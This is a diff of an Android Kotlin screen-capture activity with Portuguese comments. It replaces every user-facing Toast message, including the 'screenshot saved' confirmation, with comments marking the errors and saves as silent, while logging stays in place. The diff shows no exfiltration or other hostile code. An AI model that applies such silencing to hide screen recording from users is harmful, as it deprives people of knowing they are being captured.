@@ -62,7 +62,7 @@ class ScreenCaptureActivity : Activity() {
             
         } catch (e: Exception) {
             Log.e(TAG, "onCreate: Erro: ${e.message}", e)
-            Toast.makeText(this, "Erro ao inicializar: ${e.message}", Toast.LENGTH_LONG).show()
+            // 🔇 Erro silencioso
             finish()
         }
     }
@@ -79,18 +79,18 @@ class ScreenCaptureActivity : Activity() {
                     startActivityForResult(intent, REQUEST_MEDIA_PROJECTION)
                 } else {
                     Log.e(TAG, "startScreenCapture: Intent de captura é null")
-                    Toast.makeText(this, "Erro ao criar intent de captura", Toast.LENGTH_LONG).show()
+                    // 🔇 Erro silencioso
                     finish()
                 }
             } else {
                 Log.w(TAG, "startScreenCapture: MediaProjection não suportado nesta versão")
-                Toast.makeText(this, "Captura de tela não suportada nesta versão", Toast.LENGTH_LONG).show()
+                // 🔇 Versão não suportada - silencioso
                 finish()
             }
             
         } catch (e: Exception) {
             Log.e(TAG, "startScreenCapture: Erro: ${e.message}", e)
-            Toast.makeText(this, "Erro ao iniciar captura: ${e.message}", Toast.LENGTH_LONG).show()
+            // 🔇 Erro silencioso
             finish()
         }
     }
@@ -104,7 +104,7 @@ class ScreenCaptureActivity : Activity() {
                 createMediaProjection(resultCode, data)
             } else {
                 Log.w(TAG, "onActivityResult: Permissão negada ou cancelada")
-                Toast.makeText(this, "Permissão de captura negada", Toast.LENGTH_SHORT).show()
+                // 🔇 Permissão negada - silencioso
                 finish()
             }
         }
@@ -117,7 +117,7 @@ class ScreenCaptureActivity : Activity() {
             mediaProjection = mediaProjectionManager?.getMediaProjection(resultCode, data)
             if (mediaProjection == null) {
                 Log.e(TAG, "createMediaProjection: MediaProjection é null")
-                Toast.makeText(this, "Erro ao criar MediaProjection", Toast.LENGTH_LONG).show()
+                // 🔇 Erro silencioso
                 finish()
                 return
             }
@@ -137,7 +137,7 @@ class ScreenCaptureActivity : Activity() {
             
         } catch (e: Exception) {
             Log.e(TAG, "createMediaProjection: Erro: ${e.message}", e)
-            Toast.makeText(this, "Erro ao criar MediaProjection: ${e.message}", Toast.LENGTH_LONG).show()
+            // 🔇 Erro silencioso
             finish()
         }
     }
@@ -164,7 +164,7 @@ class ScreenCaptureActivity : Activity() {
             
             if (virtualDisplay == null) {
                 Log.e(TAG, "captureScreen: VirtualDisplay é null")
-                Toast.makeText(this, "Erro ao criar VirtualDisplay", Toast.LENGTH_LONG).show()
+                // 🔇 Erro silencioso
                 finish()
                 return
             }
@@ -204,7 +204,7 @@ class ScreenCaptureActivity : Activity() {
             
         } catch (e: Exception) {
             Log.e(TAG, "captureScreen: Erro: ${e.message}", e)
-            Toast.makeText(this, "Erro ao capturar tela: ${e.message}", Toast.LENGTH_LONG).show()
+            // 🔇 Erro silencioso
             finish()
         }
     }
@@ -255,7 +255,7 @@ class ScreenCaptureActivity : Activity() {
             
         } catch (e: Exception) {
             Log.e(TAG, "processCapturedImage: Erro: ${e.message}", e)
-            Toast.makeText(this, "Erro ao processar imagem: ${e.message}", Toast.LENGTH_LONG).show()
+            // 🔇 Erro silencioso
         }
     }
     
@@ -293,7 +293,7 @@ class ScreenCaptureActivity : Activity() {
                 Log.d(TAG, "saveScreenshot: ✅ Arquivo criado com sucesso!")
                 
                 // Mostra toast de sucesso
-                Toast.makeText(this, "Screenshot salvo: $fileName", Toast.LENGTH_LONG).show()
+                // 🔇 Screenshot salvo silenciosamente
                 
                 // Aguarda um pouco e finaliza
                 android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
@@ -311,13 +311,13 @@ class ScreenCaptureActivity : Activity() {
                 Log.e(TAG, "saveScreenshot: Arquivo existe: ${file.exists()}")
                 Log.e(TAG, "saveScreenshot: Tamanho: ${file.length()} bytes")
                 
-                Toast.makeText(this, "Erro ao salvar screenshot", Toast.LENGTH_LONG).show()
+                // 🔇 Erro silencioso
                 finish()
             }
             
         } catch (e: Exception) {
             Log.e(TAG, "saveScreenshot: Erro: ${e.message}", e)
-            Toast.makeText(this, "Erro ao salvar screenshot: ${e.message}", Toast.LENGTH_LONG).show()
+            // 🔇 Erro silencioso
             finish()
         }
     }
